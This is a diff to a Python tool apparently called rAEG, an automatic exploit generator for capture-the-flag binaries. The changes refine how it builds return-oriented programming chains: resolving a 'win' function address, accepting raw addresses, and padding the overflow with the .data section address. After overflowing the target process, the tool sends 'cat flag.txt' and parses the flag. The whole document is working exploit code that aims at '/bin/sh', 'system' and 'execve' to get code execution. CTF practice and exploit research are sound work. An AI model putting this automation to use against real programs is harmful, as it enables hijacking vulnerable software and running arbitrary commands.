@@ -45,7 +45,7 @@ context.update(
 )
 
 # Important lists to use such as useful strings, the functions we want to call in our rop chain, the calling convention, and useful rop functions with gadgets
-strings =  ["/bin/sh", "/bin/cat flag.txt", "cat flag.txt", "flag.txt"]
+strings =  ["/bin/sh","/bin/cat flag.txt", "cat flag.txt", "flag.txt"]
 exploit_functions = ["win", "system", "execve", "syscall", "print_file"]
 arg_regs = [b"rdi", b"rsi", b"rdx", b"rcx", b"r8", b"r9"]
 useful_rop_functions = ["__libc_csu_init"]
@@ -153,7 +153,9 @@ class rAEG:
                 for x in re_values:
                     temp = int(x.split(', ')[1],16)
                     params.append(p64(temp))
-                self.exploit_function = "win"
+                #self.exploit_function = "win"
+                self.exploit_function = self.find_goal("win")
+                params = []
                 logger.info("Found win function")
             elif "system" in self.elf.sym.keys():
                 self.exploit_function = "system"
@@ -510,7 +512,10 @@ class rAEG:
 
             chain += p64(syscall_gadget)
         else:
-            chain += p64(self.elf.sym[function])
+            if type(function) == int:
+                chain += p64(function)
+            else:
+                chain += p64(self.elf.sym[function])
         logger.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")
 
         return chain
@@ -839,6 +844,7 @@ class rAEG:
     def exploit(self):
         p = self.start_process()
 
+        addr = self.elf.get_section_by_name(".data").header.sh_addr
 
         if self.rop_chain != None:
             if self.symbolic_padding != None:
@@ -847,16 +853,19 @@ class rAEG:
                     p.sendline(self.symbolic_padding + self.rop_chain)
                 else:
                     logger.info(f"Sending ROP Chain with {self.padding} padding")
-                    p.sendline(b"A" * self.padding + self.rop_chain)
+                    padding = b"A" * (self.padding - 8) + p64(addr)
+
+                    p.sendline(padding + self.rop_chain)
             else:
                 logger.info(f"Sending ROP Chain with {self.padding} padding")
-                p.sendline(b"A" * self.padding + self.rop_chain)
+                padding = b"A" * (self.padding - 8) + p64(addr)
+                p.sendline(padding + self.rop_chain)
 
 
             p.sendline(b"cat flag.txt")
             p.sendline(b"cat flag.txt")
             try:
-                output = p.recvall(timeout=30).decode()
+                output = p.recvall(timeout=2).decode()
                 self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                 print(self.flag)
             except:
